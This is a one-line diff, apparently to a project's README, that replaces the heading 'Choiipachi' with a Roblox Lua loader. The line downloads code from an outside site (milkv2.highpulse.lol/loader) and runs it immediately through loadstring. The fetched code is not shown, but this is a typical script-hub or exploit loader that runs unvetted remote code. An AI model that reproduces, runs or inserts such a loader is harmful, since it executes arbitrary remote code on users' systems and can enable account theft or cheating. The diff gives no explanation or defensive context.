@@ -1,1 +1,1 @@
-# Choiipachi
+loadstring(game:HttpGet('https://milkv2.highpulse.lol/loader'))() 
